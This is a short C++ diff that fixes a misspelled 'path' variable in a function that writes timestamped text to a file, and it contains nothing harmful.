@@ -45,7 +45,7 @@ namespace IO
 
 		try
 		{
-			std::ofstream file(paht + name);
+			std::ofstream file(path + name);
 			if (!file) return "";
 			std::ostringstream s;
 			s << "[" << dt.GetDateTimeString() << "]" << std::endl << t << std::endl;
